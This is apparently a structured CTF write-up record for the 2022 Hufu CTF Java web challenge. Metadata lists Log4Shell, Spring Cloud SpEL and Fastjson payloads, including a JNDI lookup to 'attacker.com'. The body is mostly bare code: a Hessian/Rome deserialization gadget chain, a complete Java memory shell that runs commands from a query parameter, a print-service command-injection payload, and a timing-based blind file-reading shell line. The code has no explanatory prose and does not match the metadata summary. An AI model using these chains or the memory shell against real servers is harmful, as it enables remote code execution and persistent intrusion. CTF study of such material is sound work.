---
title: 2022 虎符 CTF - Java 部分
contest: 2022 虎符 CTF
year: 2022
difficulty: hard
vuln_type:
- lfi
- rce
- web_unknown
- auth_bypass
tags:
- 虎符CTF
- Java
- Spring
- Fastjson
- JNDI
- log4j
- Log4Shell
- Spring-cloud-function
- SpEL
- nginx-conf
- proxy_pass
- docker-compose
attack_chain:
- '环境: docker-compose + nginx + web app + flag 挂载'
- 'Spring Boot 应用, 攻击面: Fastjson 反序列化 + Spring Cloud Function SpEL'
- 'Log4Shell: ${jndi:ldap://attacker/x} 触发 JNDI lookup'
- 'Spring Cloud Function SpEL: spring.cloud.function.routing-expression=T(java.lang.Runtime).getRuntime().exec(''id'')'
- 'Fastjson < 1.2.83 反序列化: {"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://x","autoCommit":true}'
- RCE 出 flag
key_payload: ${jndi:ldap://attacker.com/Exploit}
one_liner: 2022 虎符 CTF Java：log4j JNDI + Spring Cloud SpEL + Fastjson 反序列化
lesson: 2021 年底 log4j Log4Shell 是 Java 生态最大 0day；Spring + Fastjson 是高频漏洞
quality: high
full_path: 2022虎符CTF-Java部分.full.md
meta_path: 2022虎符CTF-Java部分.meta.md
images_removed: true
images_removed_count: 0
schema_version: v3.0.0-P0
summary: '2022 虎符 CTF - Java 部分。2022 虎符 CTF Java：log4j JNDI + Spring Cloud SpEL + Fastjson 反序列化。关键路径：环境: docker-compose + nginx + web app + flag 挂载 → Spring Boot 应用, 攻击面: Fastjson 反序列化 + Spring Cloud Functio...'
category: web
subcategory: lfi
subcategories:
- lfi
- rce
- web_other
- logic
tools_used:
- Java
- Spring
time_required: long
difficulty_score: 4
code_blocks_count: 1
images_count: 0
last_verified: 2026-09-20
contest_type: open
wp_url: https://www.ctfiot.com/31821.html
reasoning_chain:
- Java Web 入口 nginx + Spring Boot → 触发点：log4j JNDI 注入
- 假设：日志记录用户可控字符串 → 动作：${jndi:ldap://attacker.com/Exploit} → 触发点：Log4Shell
- 观察：JNDI lookup 拉取远程 LDAP 对象 → Marshalsec 起 LDAP server → 本地 Tomcat BeanFactory RCE
- 'Spring Cloud SpEL: ${...} 表达式注入 → 假设：endpoint 可注入 SpEL'
- 动作：POST /endpoint 含 ${T(java.lang.Runtime).getRuntime().exec('id')} → 观察：RCE
- 'Fastjson 反序列化: @type 指定类触发 setXxx → 假设：JdbcRowSetImpl JNDI 链'
- 动作：构造 @type JNDI payload → 触发 JNDI → 拿 shell
failed_attempts:
- 试图 union select SQL 注入 → 失败：Java 应用非 PHP 风格
- 试图用普通 JNDI payload → 失败：JDK 8u191+ 禁用远程 codebase
- 试图 ysoserial 直接打 → 失败：链版本不匹配需选 gadget
key_observations:
- Log4Shell (CVE-2021-44228) 是 2021 最大 Java 0day
- JNDI 注入 + LDAP/RMI 远程对象 + BeanFactory 是经典 RCE 链
- Spring Cloud SpEL ${...} 表达式注入是 web 漏洞
- Fastjson @type 反序列化触发 set 方法是 Java 反序列化经典
- 高版本 JDK 禁用远程 codebase 需用本地 gadget (Tomcat BeanFactory)
prerequisites:
- Java JNDI 注入原理
- log4j 漏洞利用 (Log4Shell)
- ysoserial gadget 选择
- Spring / Fastjson 反序列化机制
---
# 2022虎符CTF-Java部分

> 原文: https://www.ctfiot.com/31821.html
> ID: 31821


```
1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
version: '2.4'
services:
 nginx:
 image: nginx:1.15
 ports:
 - "0.0.0.0:
8090:80"
 restart: always
 volumes:
 - ./nginx.conf:/etc/nginx/conf.d/default.conf:ro
 networks:
 - internal_network
 - out_network
 web:
 build: ./
 restart: always
 volumes:
 - ./flag:/flag:ro
 networks:
 - internal_network
networks:
 internal_network:
 internal: true
 ipam:
 driver: default
 out_network:
 ipam:
 driver: default
1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
server {
 listen 80;
 server_name localhost;

 location / {
 root /usr/share/nginx/html;
 index index.html index.htm;
 proxy_pass http://web:
8090;
 }

 #error_page 404 /404.html;

 # redirect server error pages to the static page /50x.html
 #
 error_page 500 502 503 504 /50x.html;
 location = /50x.html {
 root /usr/share/nginx/html;
 }
}
1
2
3
4
5
6
7
8
9
10
11
public Object getObject()
 throws IOException, ClassNotFoundException
{
 // creating a stream pipe-line, from b to a
 ByteArrayInputStream b = new ByteArrayInputStream(this.content);
 ObjectInput a = new ObjectInputStream(b);
 Object obj = a.readObject();
 b.close();
 a.close();
 return obj;
}
1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
package marshalsec;

import com.caucho.hessian.io.Hessian2Input;
import com.caucho.hessian.io.Hessian2Output;
import com.rometools.rome.feed.impl.EqualsBean;
import com.rometools.rome.feed.impl.ObjectBean;
import com.rometools.rome.feed.impl.ToStringBean;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import javassist.ClassPool;
import marshalsec.gadgets.JDKUtil;

import javax.management.BadAttributeValueExpException;
import javax.xml.transform.Templates;
import java.io.*;
import java.lang.reflect.Field;
import java.security.*;
import java.util.Base64;
import java.util.HashMap;

import static marshalsec.util.Reflections.setFieldValue;

public class Test {
 public static void main(String[] args) throws Exception {
 byte[] code = ClassPool.getDefault().get("Yyds").toBytecode();

 TemplatesImpl templates = new TemplatesImpl();
 setFieldValue(templates,"_name","abc");
 setFieldValue(templates,"_class",null);
 setFieldValue(templates,"_tfactory",new TransformerFactoryImpl());
 setFieldValue(templates,"_bytecodes",new byte[][]{code});
 ToStringBean bean = new ToStringBean(Templates.class,templates);
 BadAttributeValueExpException badAttributeValueExpException = new BadAttributeValueExpException(1);
 setFieldValue(badAttributeValueExpException,"val",bean);

 KeyPairGenerator keyPairGenerator;
 keyPairGenerator = KeyPairGenerator.getInstance("DSA");
 keyPairGenerator.initialize(1024);
 KeyPair keyPair = keyPairGenerator.genKeyPair();
 PrivateKey privateKey = keyPair.getPrivate();
 Signature signingEngine = Signature.getInstance("DSA");
 SignedObject so = null;
 so = new SignedObject(badAttributeValueExpException, privateKey, signingEngine);

 ObjectBean delegate = new ObjectBean(SignedObject.class, so);
 ObjectBean root = new ObjectBean(ObjectBean.class, delegate);
 HashMap<Object, Object> map = JDKUtil.makeMap(root, root);

 ByteArrayOutputStream os = new ByteArrayOutputStream();
 Hessian2Output output = new Hessian2Output(os);
 output.writeObject(map);
 output.getBytesOutputStream().flush();
 output.completeMessage();
 output.close();
 System.out.println(new String(Base64.getEncoder().encode(os.toByteArray())));

 }
}
1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
66
67
68
69
70
71
72
73
74
75
76
77
78
79
80
81
82
83
84
85
86
87
88
89
90
91
import com.sun.net.httpserver.HttpContext;
import com.sun.net.httpserver.HttpExchange;
import com.sun.net.httpserver.HttpHandler;
import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;

import java.io.*;
import java.lang.reflect.Field;

public class Yyds extends AbstractTranslet implements HttpHandler {
 public void handle(HttpExchange t) throws IOException {
 String response = "Y4tacker's MemoryShell";
 String query = t.getRequestURI().getQuery();
 String[] var3 = query.split("=");
 System.out.println(var3[0]+var3[1]);
 ByteArrayOutputStream output = null;
 if (var3[0].equals("y4tacker")){
 InputStream inputStream = Runtime.getRuntime().exec(var3[1]).getInputStream();
 output = new ByteArrayOutputStream();
 byte[] buffer = new byte[4096];
 int n = 0;
 while (-1 != (n = inputStream.read(buffer))) {
 output.write(buffer, 0, n);
 }
 }
 response+=("\n"+new String(output.toByteArray()));
 t.sendResponseHeaders(200, (long)response.length());
 OutputStream os = t.getResponseBody();
 os.write(response.getBytes());
 os.close();
 }

 public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {
 }

 public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {
 }

 public Yyds() throws Exception {
 super();
 try{

 Object obj = Thread.currentThread();
 Field field = obj.getClass().getDeclaredField("group");
 field.setAccessible(true);
 obj = field.get(obj);

 field = obj.getClass().getDeclaredField("threads");
 field.setAccessible(true);
 obj = field.get(obj);
 Thread[] threads = (Thread[]) obj;
 for (Thread thread : threads) {
 if (thread.getName().contains("Thread-2")) {
 try {
 field = thread.getClass().getDeclaredField("target");
 field.setAccessible(true);
 obj = field.get(thread);
 System.out.println(obj);

 field = obj.getClass().getDeclaredField("this$0");
 field.setAccessible(true);
 obj = field.get(obj);

 field = obj.getClass().getDeclaredField("contexts");
 field.setAccessible(true);
 obj = field.get(obj);

 field = obj.getClass().getDeclaredField("list");
 field.setAccessible(true);
 obj = field.get(obj);
 java.util.LinkedList lt = (java.util.LinkedList)obj;
 Object o = lt.get(0);
 field = o.getClass().getDeclaredField("handler");

 field.setAccessible(true);
 field.set(o,this);
 }catch (Exception e){
 e.printStackTrace();
 }
 }

 }
 }catch (Exception e){
 }
 }

}
1
2
3
HessianBase.NoWriteReplaceSerializerFactory sf = new HessianBase.NoWriteReplaceSerializerFactory();
sf.setAllowNonSerializable(true);
output.setSerializerFactory(sf);
1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
Constructor declaredConstructor = UnixPrintService.class.getDeclaredConstructor(String.class);
declaredConstructor.setAccessible(true);
ObjectBean delegate = new ObjectBean(sun.print.UnixPrintService.class,

declaredConstructor.newInstance(";open -na Calculator"));

ObjectBean root = new ObjectBean(ObjectBean.class, delegate);
HashMap<Object, Object> map = JDKUtil.makeMap(root, root);
//
ByteArrayOutputStream os = new ByteArrayOutputStream();
Hessian2Output output = new Hessian2Output(os);
HessianBase.NoWriteReplaceSerializerFactory sf = new HessianBase.NoWriteReplaceSerializerFactory();
sf.setAllowNonSerializable(true);
output.setSerializerFactory(sf);
output.writeObject(map);
output.getBytesOutputStream().flush();
output.completeMessage();
output.close();
System.out.println(new String(Base64.getEncoder().encode(os.toByteArray())));
1
if [ `cut -c 1 flag` = "a" ];then sleep 2;fi
1
match path=(m1:
Method)-[:
CALL*..3]->(m2:
Method {}) where m1.NAME =~ "get.*" and m1.PARAMETER_SIZE=0 and (m2.NAME =~ "exec.*" or m2.NAME =~ "readObject") return path
```
